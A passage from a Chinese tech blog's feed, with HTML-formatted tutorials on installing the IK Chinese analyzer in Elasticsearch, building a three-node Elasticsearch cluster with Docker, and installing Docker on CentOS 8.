class="line">cd <span class="symbol">C:</span>\Users\M\Desktop\code-demo\elasticsearch-analysis-ik</span><br><span class="line">mvn package -Pdist,native -DskipTests -Dtar</span><br><span class="line"><span class="comment"># 使用maven打包完成之后，即可生成一个target文件夹，里面有./releases/elasticsearch-analysis-ik-5.6.8.zip</span></span><br><span class="line"><span class="comment"># 在虚拟机中创建一个ik文件夹</span></span><br><span class="line">mkdir ik</span><br><span class="line"><span class="comment"># 之后使用xftp将该zip文件上传到ik文件夹中，然后使用unzip命令解压该zip文件，解压之后删除zip文件</span></span><br><span class="line">unzip elasticsearch-analysis-ik-<span class="number">5.6</span>.<span class="number">8</span>.zip</span><br><span class="line">rm -rf elasticsearch-analysis-ik-<span class="number">5.6</span>.<span class="number">8</span>.zip</span><br><span class="line"><span class="comment"># 之后使用docker将该ik文件夹传到elasticsearch容器的plugins中</span></span><br><span class="line">docker cp ./ik <span class="symbol">elasticsearch:</span>/usr/share/elasticsearch/plugins</span><br><span class="line"><span class="comment"># 进入elasticsearch容器</span></span><br><span class="line">docker exec -it new-elasticsearch /bin/bash</span><br><span class="line"><span class="comment"># 之后如下命令可查看是否成功上传ik文件夹</span></span><br><span class="line">root<span class="variable">@78f36ce60b3f</span><span class="symbol">:/usr/share/elasticsearch</span><span class="comment"># cd plugins/</span></span><br><span class="line">root<span class="variable">@78f36ce60b3f</span><span class="symbol">:/usr/share/elasticsearch/plugins</span><span class="comment"># ls</span></span><br><span class="line">ik</span><br><span class="line">root<span class="variable">@78f36ce60b3f</span><span class="symbol">:/usr/share/elasticsearch/plugins</span><span class="comment"># cd ik</span></span><br><span class="line">root<span class="variable">@78f36ce60b3f</span><span class="symbol">:/usr/share/elasticsearch/plugins/ik</span><span class="comment"># ls</span></span><br><span class="line">commons-codec-<span class="number">1.9</span>.jar        httpclient-<span class="number">4.5</span>.<span class="number">2</span>.jar</span><br><span class="line">commons-logging-<span class="number">1.2</span>.jar        httpcore-<span class="number">4.4</span>.<span class="number">4</span>.jar</span><br><span class="line">config             plugin-descriptor.properties</span><br><span class="line">elasticsearch-analysis-ik-<span class="number">5.6</span>.<span class="number">8</span>.jar</span><br><span class="line">root<span class="variable">@78f36ce60b3f</span><span class="symbol">:/usr/share/elasticsearch/plugins/ik</span><span class="comment"># </span></span><br><span class="line"><span class="comment"># 之后进入到bin目录下，并查看已经安装的ik分词器插件</span></span><br><span class="line">root<span class="variable">@78f36ce60b3f</span><span class="symbol">:cd</span> /usr/share/elasticsearch/bin</span><br><span class="line">root<span class="variable">@78f36ce60b3f</span><span class="symbol">:/usr/share/elasticsearch/bin</span><span class="comment"># elasticsearch-plugin list</span></span><br><span class="line">ik</span><br></pre></td></tr></table></figure><p>以上操作完成之后，就算是完成了在Elasticsearch中引入ik中文分词器插件了，注意：以上步骤务必需要完全一致，否则会造成各种问题。</p><h3 id="分词结果测试"><a href="#分词结果测试" class="headerlink" title="分词结果测试"></a>分词结果测试</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 打开chrom浏览器，访问：http:<span class="comment">//192.168.220.201:5601/，若出现kibana界面，说明kibana安装正常</span></span></span><br><span class="line"><span class="meta"># 进入kibana的Dev Tools界面，然后使用如下测试ik中文分词器插件是否正常安装</span></span><br><span class="line">GET bank/_analyze</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"text"</span>: <span class="string">"现在是大年三十凌晨一点三十分，有点冷，我写完这篇文章就睡觉！"</span>,</span><br><span class="line">  <span class="string">"analyzer"</span>: <span class="string">"ik_smart"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行之后，测试ik中文分词结果如下，可见已经完成了对中文句子的分词<br><img></p><h2 id="Elasticsearch集群的搭建"><a href="#Elasticsearch集群的搭建" class="headerlink" title="Elasticsearch集群的搭建"></a>Elasticsearch集群的搭建</h2><h3 id="创建集群所需要的配置文件及数据文件，以便容器的映射"><a href="#创建集群所需要的配置文件及数据文件，以便容器的映射" class="headerlink" title="创建集群所需要的配置文件及数据文件，以便容器的映射"></a>创建集群所需要的配置文件及数据文件，以便容器的映射</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mkdir /mydata</span><br><span class="line">cd /mydata</span><br><span class="line">mkdir elasticsearch1</span><br><span class="line">cd elasticsearch1</span><br><span class="line">mkdir data # 注意要确保data目录下为空，否则在实际运行过程中会出错</span><br><span class="line">mkdir config</span><br><span class="line">cd conf</span><br><span class="line">vim elasticsearch.yml</span><br><span class="line"><span class="comment"># elasticsearch.yml文件配置信息如下</span></span><br></pre></td></tr></table></figure><p>elasticsearch.yml文件的配置信息：<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开启跨域，为了让es-head可以访问，此处需要额外安装header插件</span></span><br><span class="line">http.cors.enabled: <span class="literal">true</span></span><br><span class="line">http.cors.allow-origin: <span class="string">"*"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 集群的名称（一样）</span></span><br><span class="line">cluster.name: elasticsearch</span><br><span class="line"><span class="comment"># 节点的名称（不一样，根据别名来配置）</span></span><br><span class="line"><span class="keyword">node</span>.name:<span class="title"> es1</span></span><br><span class="line"><span class="comment"># 指定该节点是否有资格被选举成为master节点，默认是true，es是默认集群中的第一台机器为master，如果这台机挂了就会重新选举master</span></span><br><span class="line"><span class="keyword">node</span>.master:<span class="title"> true</span></span><br><span class="line"><span class="comment"># 允许该节点存储数据(默认开启)</span></span><br><span class="line"><span class="keyword">node</span>.data:<span class="title"> true</span></span><br><span class="line"><span class="comment"># 允许任何ip访问</span></span><br><span class="line">network.host: <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="comment"># 通过这个ip列表进行节点发现，我这里配置的是各个容器的ip</span></span><br><span class="line">discovery.zen.ping.unicast.hosts: [<span class="string">"192.168.220.200:9300"</span>,<span class="string">"192.168.220.200:9301"</span>,<span class="string">"192.168.220.200:9302"</span>]</span><br><span class="line"><span class="comment">#如果没有这种设置,遭受网络故障的集群就有可能将集群分成两个独立的集群 – 导致脑裂 - 这将导致数据丢失</span></span><br><span class="line">discovery.zen.minimum_master_nodes: <span class="number">2</span></span><br></pre></td></tr></table></figure></p><p>第一个elasticsearch配置文件创建好后，同理创建其他两个节点<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 配置es2</span></span><br><span class="line">cd /mydata</span><br><span class="line">cp -r ./elasticsearch1 ./elasticsearch2</span><br><span class="line"><span class="comment"># 将其中的conf/elasticsearch.yml中配置修改一处信息</span></span><br><span class="line"><span class="keyword">node</span>.<span class="title">name</span>=es2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置es3</span></span><br><span class="line">cd /mydata</span><br><span class="line">cp -r ./elasticsearch1 ./elasticsearch3</span><br><span class="line"><span class="comment"># 将其中的conf/elasticsearch.yml中配置修改一处信息</span></span><br><span class="line"><span class="keyword">node</span>.<span class="title">name</span>=es3</span><br></pre></td></tr></table></figure></p><h3 id="创建elasticsearch容器并启动"><a href="#创建elasticsearch容器并启动" class="headerlink" title="创建elasticsearch容器并启动"></a>创建elasticsearch容器并启动</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 创建es1容器并启动</span></span><br><span class="line">docker run --name es1 -p <span class="number">9200</span>:<span class="number">9200</span> -p <span class="number">9300</span>:<span class="number">9300</span> \</span><br><span class="line">-e ES_JAVA_OPTS=<span class="string">"-Xms256m -Xmx256m"</span> \</span><br><span class="line">-v <span class="meta-keyword">/mydata/</span>elasticsearch1<span class="meta-keyword">/config/</span>elasticsearch.yml:<span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/elasticsearch/</span>config/elasticsearch.yml \</span><br><span class="line">-v <span class="meta-keyword">/mydata/</span>elasticsearch1/data:<span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/elasticsearch/</span>data -d elasticsearch:<span class="number">5.6</span><span class="number">.8</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 引入ik分词器</span></span><br><span class="line">docker cp ./ik es1:<span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/elasticsearch/</span>plugins</span><br><span class="line"></span><br><span class="line"><span class="meta"># 创建es2容器并启动</span></span><br><span class="line">docker run --name es2 -p <span class="number">9201</span>:<span class="number">9200</span> -p <span class="number">9301</span>:<span class="number">9300</span> \</span><br><span class="line">-e ES_JAVA_OPTS=<span class="string">"-Xms256m -Xmx256m"</span> \</span><br><span class="line">-v <span class="meta-keyword">/mydata/</span>elasticsearch2<span class="meta-keyword">/config/</span>elasticsearch.yml:<span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/elasticsearch/</span>config/elasticsearch.yml \</span><br><span class="line">-v <span class="meta-keyword">/mydata/</span>elasticsearch2/data:<span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/elasticsearch/</span>data -d elasticsearch:<span class="number">5.6</span><span class="number">.8</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 创建es3容器并启动</span></span><br><span class="line">docker run --name es3 -p <span class="number">9202</span>:<span class="number">9200</span> -p <span class="number">9302</span>:<span class="number">9300</span> \</span><br><span class="line">-e ES_JAVA_OPTS=<span class="string">"-Xms256m -Xmx256m"</span> \</span><br><span class="line">-v <span class="meta-keyword">/mydata/</span>elasticsearch3<span class="meta-keyword">/config/</span>elasticsearch.yml:<span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/elasticsearch/</span>config/elasticsearch.yml \</span><br><span class="line">-v <span class="meta-keyword">/mydata/</span>elasticsearch3/data:<span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/elasticsearch/</span>data -d elasticsearch:<span class="number">5.6</span><span class="number">.8</span></span><br></pre></td></tr></table></figure><p>至此，完成以上操作即可实现了Elasticsearch集群的搭建</p><ul><li>分别访问<code>http://192.168.220.200:9200、http://192.168.220.200:9201、http://192.168.220.200:9202</code>，即可发现已经搭建完成，并显示了各个es节点的对应信息。</li><li>访问<code>http://192.168.220.200:9200/_cat/nodes</code>可查看集群节点。</li><li>访问<code>http://192.168.220.200:9200//_cat/health</code>查看健康状况（green，yellow、red）</li></ul><p><img></p><h3 id="所遇问题"><a href="#所遇问题" class="headerlink" title="所遇问题"></a>所遇问题</h3><ul><li><p>实例化容器之后，可能会受到进程数的限制，我们需要提高虚拟机的进程数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/sysctl.conf</span><br><span class="line"><span class="comment"># 添加如下一条配置</span></span><br><span class="line">vm.<span class="attribute">max_map_count</span>=655360</span><br><span class="line"><span class="comment"># 退出后重启配置</span></span><br><span class="line">sysctl -p</span><br></pre></td></tr></table></figure></li><li><p>当实例化以上三个es容器之后，可能会存在一定的内存问题，这个时候，我们需要提高虚拟机的内存</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 实例化以上三个es容器之后，查看当前可用内存</span></span><br><span class="line">free -m</span><br><span class="line"><span class="meta"># 运行以上命令之后，可能会发现当前可用配置只有50多，而且当我们访问http://192.168.220.200:9200的时候也会发现请求失败这个时候我们打开对应虚拟机的设置，将内存设置3GB即可，不一会儿重新进入虚拟机，使用free -m命令即可发现此时内存还剩1000多可用</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 完成上述配置之后，我们重启三个es容器</span></span><br><span class="line">docker restart es1 es2 es3 || docker start es1 es2 es3</span><br><span class="line"></span><br><span class="line"><span class="meta"># 等待容器重启之后，使用chrom浏览器访问es</span></span><br><span class="line">http:<span class="comment">//192.168.220.200:9200</span></span><br><span class="line">http:<span class="comment">//192.168.220.200:9201</span></span><br><span class="line">http:<span class="comment">//192.168.220.200:9202</span></span><br><span class="line"><span class="meta"># 可发现已经搭建完成，且显示了各个es节点的对应信息</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 在kibana的dev tools下查看集群节点</span></span><br><span class="line">GET /_cat/nodes</span><br><span class="line"><span class="meta"># 查看健康状况（green，yellow、red）</span></span><br><span class="line">GET /_cat/health</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;img src=&quot;https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=21287732,2992447167&amp;fm=26&amp;gp=0.jpg&quot;&gt;&lt;/center&gt;

&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Elasticsearch是什么？既然它是英文的，我们不妨借助有道从&lt;code&gt;Elasticsearch&lt;/code&gt;这几个字母出发来看看其字面上所表达的意思吧。其分为elastic和search两个独立的单词，既然如此，我们无脑有道一波，得到的解释如下：&lt;br&gt;从有道的解释来看，我们可以简单的对其理解为：&lt;font color=&quot;red&quot;&gt;Elasticsearch是及其具有弹性的、灵活的、像松紧带一样的且可供搜寻检索的一款工具。&lt;/font&gt;o(*≧▽≦)ツ┏━┓&lt;/p&gt;
&lt;p&gt;百度百科对其解释如下：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java语言开发的，并作为Apache许可条款下的开放源码发布，是一种流行的企业级搜索引擎。ElasticSearch用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。官方客户端在Java、.NET（C#）、PHP、Python、Apache、Groovy、Ruby和许多其他语言中都是可用的。根据DB-Engines的排名显示，Elasticsearch是最受欢迎的企业搜索引擎，其次是Apache Solr，也是基于Lucene。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;从如上信息我们可以得知，Elasticsearch是一款实时、分布式存储的搜索引擎，在实际开发过程中，我们常常会把数据放在Elasticsearch搜索引擎中，然后从引擎中去实际需要的数据。而且在实际搜索过程中，我们也会有许多的Api支持来对数据进行检索，比如排序、条件查询等，其中在Elasticsearch中最为强大之处就是他的模糊检索功能。讲到这，可能有些Mysql经验但没接触过Elasticsearch的朋友可能会有个疑问，Mysql大法不是无敌么，其中的&lt;code&gt;like&lt;/code&gt;语句不能模糊查询么？&lt;code&gt;where and&lt;/code&gt;不能条件检索么？&lt;code&gt;orderby&lt;/code&gt;不能对数据进行排序么？我随随便便就信手拈来一个Sql语句不就能实现业务的需求么：&lt;/p&gt;
&lt;figure class=&quot;highlight n1ql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;select&lt;/span&gt; department_name, &lt;span class=&quot;built_in&quot;&gt;count&lt;/span&gt;(*) 员工个数&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; departments d, employees &lt;span class=&quot;built_in&quot;&gt;e&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;where&lt;/span&gt; d.department_id = &lt;span class=&quot;built_in&quot;&gt;e&lt;/span&gt;.department_id&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;group&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;by&lt;/span&gt; d.department_id&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;having&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;count&lt;/span&gt;(*)&amp;gt;&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;order&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;by&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;count&lt;/span&gt;(*) &lt;span class=&quot;keyword&quot;&gt;desc&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Java" scheme="https://muzimz.cn/categories/Java/"/>
    
    
      <category term="Java" scheme="https://muzimz.cn/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>一文入门Docker容器技术</title>
    <link href="https://muzimz.cn/2020/01/03/%E4%B8%80%E6%96%87%E5%85%A5%E9%97%A8Docker%E5%AE%B9%E5%99%A8%E6%8A%80%E6%9C%AF/"/>
    <id>https://muzimz.cn/2020/01/03/一文入门Docker容器技术/</id>
    <published>2020-01-03T14:36:25.000Z</published>
    <updated>2020-02-21T05:03:06.578Z</updated>
    
    <content type="html"><![CDATA[<center><img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1581752085473&di=c4c4e3eda8cba3ae95fde0488ba1e44a&imgtype=0&src=http%3A%2F%2Fimg2018.cnblogs.com%2Fblog%2F1813823%2F201911%2F1813823-20191121223145795-1635208897.png"></center><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>相信点进这篇文章的Coder，不管是在各大技术论坛上、技术交流群，亦或招聘网上，应该都有见到过Doker容器技术的面孔，随着社会节奏的加快以及迫于生活的压力，在计算机技术日新月异的今天，真正能够沉下心来学习一门技术的时间真的不多。为了不让新型冠状病毒迅速蔓延，全国人民都居家隔离，趁着这段空闲的时间，我也该是时候把过去学习时所积累的笔记沉淀一下了。本文主要是从是什么、为什么、怎么做的角度来介绍Docker容器技术得入门，能让初次接触Docker容器技术的朋友更快的使用Docker。</p><a id="more"></a><h2 id="Docker是什么"><a href="#Docker是什么" class="headerlink" title="Docker是什么"></a>Docker是什么</h2><p>对于Docker，官方的介绍如下：</p><blockquote><p>Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的 Linux或Windows机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。</p></blockquote><p>在实际的开发过程中，我们往往会因为环境的搭建而浪费过多的时间，而现如今有了Docker容器技术的支持，我们不再过于担心各种因为环境问题而造成的过多时间的浪费。Docker容器引擎中已经为我们提供了开发过程中所需要的各种镜像，我们需要有Resid数据库、Elasticsearch搜索技术、Mq消息队列等支持，我们都可以使用Docker中的pull命令来从中央仓库中进行拉取，而不像传统那样从各大官网亦或github中进行下载。读到这里的朋友应该会有所发现，Docker就有点类似Maven管理工具，但Docker的强大之处可并不止步于此，查阅了解后，Docker主要有以下几大特性：</p><blockquote><ul><li>Automating the packaging and deployment of applications（使应用的打包与部署自动化）</li><li>Creation of lightweight, private PAAS environments（创建轻量、私密的PAAS环境）</li><li>Automated testing and continuous integration/deployment（实现自动化测试和持续的集成/部署）</li><li>Deploying and scaling web apps, databases and backend services（部署与扩展webapp、数据库和后台服务）</li></ul></blockquote><p>总之，Docker容器是现如今相当火热的一门技术。之前读到网上有着这么一句话：电脑如果有问题，没有是重装系统解决不了的。话虽如此，但是一旦重装系统之后，我们之前系统中所有保存资源都被消除了，我们需要使用QQ增进朋友之间的感情，则要到鹅厂中去下载、安装；需要网易云音乐来放松心情，则要到官网中安装、下载，以及需要下载并安装其他各大软件才能满足自己的实际需求，一个不小心还可能会绑架其他垃圾软件。当然有的朋友会在重装系统之前自己的资源备份以下，重装系统之后再直接使用，但依然免不了<font color="red">N个下一步</font>所带来的时间消耗。假如现在有这么一个容器，里面存放着我们需要的所有资源，在我们需要的时候只需要一行简单的<code>pull</code>命令即可迅速完成所有软件的下载安装步骤，这岂不美哉！</p><center><img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1581754676089&di=47e49e652b363c2d53b40f0b1e59b6f7&imgtype=0&src=http%3A%2F%2Fimg.xinxic.com%2Fimg%2F5060f3fe264ea289.jpg" width="300"></center><p>没错，Docker容器就是基于这么一个思想来解决我们各大烦恼。如果对于Docker容器技术的理解还不是特别清楚，可拜读一下：<a href="https://www.chainnews.com/articles/668418042258.htm" target="_blank" rel="noopener">漫画 | 从搬家到容器技术 Docker 应用场景解析</a>，这篇文章使用漫画的形式来给读者介绍Docker容器的优势。</p><h2 id="Docker的安装及测试"><a href="#Docker的安装及测试" class="headerlink" title="Docker的安装及测试"></a>Docker的安装及测试</h2><h3 id="Docker的安装"><a href="#Docker的安装" class="headerlink" title="Docker的安装"></a>Docker的安装</h3><p>我们往往是使用Linux系统来安装Docker，在之前的文章也有过Linux系统的安装，这里就不多介绍了。下面我们就在CentOS Linux release 8.0.1905 (Core)系统下来安装一下Docker吧。</p><p>查看自己的Linux版本：<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@iZ<span class="name">m5</span>eei<span class="number">156</span>c<span class="number">9</span>h<span class="number">3</span>hrdjpe<span class="number">77</span>Z ~]<span class="attr"># cat /etc/redhat-release</span></span><br><span class="line"><span class="attr">CentOS Linux release 8</span><span class="number">.0.</span><span class="number">1905</span> <span class="comment">(Core)</span></span><br></pre></td></tr></table></figure></p><p>在安装Docker之前，我们先更新一下<code>yum</code><br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">update yum</span></span><br></pre></td></tr></table></figure></p><p>安装Docker需要的软件包<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">yum</span> install -y yum-utils device-mapper-persistent-<span class="class"><span class="keyword">data</span> lvm2</span></span><br></pre></td></tr></table></figure></p><p>设置一下docker的yum源<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum-config-manager --<span class="built_in">add</span>-repo http<span class="variable">s:</span>//download.docker.<span class="keyword">com</span>/linux/centos/docker-<span class="keyword">ce</span>.repo</span><br></pre></td></tr></table></figure></p><p>查看仓库中所有的docker版本，以便安装我们需要的Docker版本<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum <span class="keyword">list</span> docker-ce --showduplicates | <span class="keyword">sort</span> -<span class="built_in">r</span></span><br></pre></td></tr></table></figure></p><p><img><br>安装需要的docker版本，此处以Docker17.12.1版本<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">yum</span> <span class="selector-tag">install</span> <span class="selector-tag">docker-ce-17</span><span class="selector-class">.12</span><span class="selector-class">.1</span><span class="selector-class">.ce</span></span><br></pre></td></tr></table></figure></p><p>成功安装之后，便可使用<code>docker version/docker -v</code>查看docker的版本<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker version</span></span><br><span class="line"><span class="string">[root@iZm5eei156c9h3hrdjpe77Z</span> <span class="string">~]#</span> <span class="string">docker</span> <span class="string">version</span></span><br><span class="line"><span class="attr">Client:</span></span><br><span class="line"><span class="attr"> Version:</span> <span class="number">17.12</span><span class="number">.1</span><span class="bullet">-ce</span></span><br><span class="line"> <span class="string">API</span> <span class="attr">version:</span> <span class="number">1.35</span></span><br><span class="line"> <span class="string">Go</span> <span class="attr">version:</span>  <span class="string">go1.9.4</span></span><br><span class="line"> <span class="string">Git</span> <span class="attr">commit:</span>  <span class="number">7390</span><span class="string">fc6</span></span><br><span class="line"><span class="attr"> Built:</span> <span class="string">Tue</span> <span class="string">Feb</span> <span class="number">27</span> <span class="number">22</span><span class="string">:15:20</span> <span class="number">2018</span></span><br><span class="line"> <span class="string">OS/Arch:</span> <span class="string">linux/amd64</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Server:</span></span><br><span class="line"><span class="attr"> Engine:</span></span><br><span class="line"><span class="attr">  Version:</span>  <span class="number">17.12</span><span class="number">.1</span><span class="bullet">-ce</span></span><br><span class="line">  <span class="string">API</span> <span class="attr">version:</span>  <span class="number">1.35</span> <span class="string">(minimum</span> <span class="string">version</span> <span class="number">1.12</span><span class="string">)</span></span><br><span class="line">  <span class="string">Go</span> <span class="attr">version:</span> <span class="string">go1.9.4</span></span><br><span class="line">  <span class="string">Git</span> <span class="attr">commit:</span> <span class="number">7390</span><span class="string">fc6</span></span><br><span class="line"><span class="attr">  Built:</span>  <span class="string">Tue</span> <span class="string">Feb</span> <span class="number">27</span> <span class="number">22</span><span class="string">:17:54</span> <span class="number">2018</span></span><br><span class="line">  <span class="string">OS/Arch:</span>  <span class="string">linux/amd64</span></span><br><span class="line"><span class="attr">  Experimental:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># docker -v</span></span><br><span class="line"><span class="string">[root@iZm5eei156c9h3hrdjpe77Z</span> <span class="string">~]#</span> <span class="string">docker</span> <span class="bullet">-v</span></span><br><span class="line"><span class="string">Docker</span> <span class="string">version</span> <span class="number">17.12</span><span class="number">.1</span><span class="bullet">-ce,</span> <span class="string">build</span> <span class="number">7390</span><span class="string">fc6</span></span><br></pre></td></tr></table></figure></p><p>之后，我们需要更换docker拉取软件的服务，这里使用的是<a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors" target="_blank" rel="noopener">阿里云镜像加速器</a>，使用加速器可以提升获取Docker官方镜像的速度：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -<span class="selector-tag">p</span> /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon<span class="selector-class">.json</span> &lt;&lt;-<span class="string">'EOF'</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"registry-mirrors"</span>: [<span class="string">"https://1ewanek5.mirror.aliyuncs.com"</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure></p><p>这样依赖，我们便完整的安装好了Docker。（PS：由于系统环境的问题，在安装过程中可能需要到其他依赖，只需要根据提示）</p><h3 id="Docker的Hello-world测试"><a href="#Docker的Hello-world测试" class="headerlink" title="Docker的Hello world测试"></a>Docker的Hello 